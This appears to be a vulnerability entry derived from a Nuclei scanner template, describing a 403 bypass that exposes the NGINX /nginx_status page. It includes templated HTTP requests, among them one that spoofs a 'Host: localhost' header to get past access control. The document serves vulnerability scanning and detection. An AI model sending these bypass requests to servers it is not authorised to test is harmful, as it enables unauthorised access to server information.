# Vulnerability: Nginx Status Page - 403 Bypass
**Classification:** CWE-22
**Source:** Nuclei Template (`nginx-status-403-bypass.yaml`)

## Description
Detected an NGINX status disclosure and a 403 bypass that allowed unauthorized access to the /nginx_status endpoint.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/nginx_status
GET {{BaseURL}}{{paths}}
@Host: localhost
GET /nginx_status HTTP/1.1
Host: localhost
```

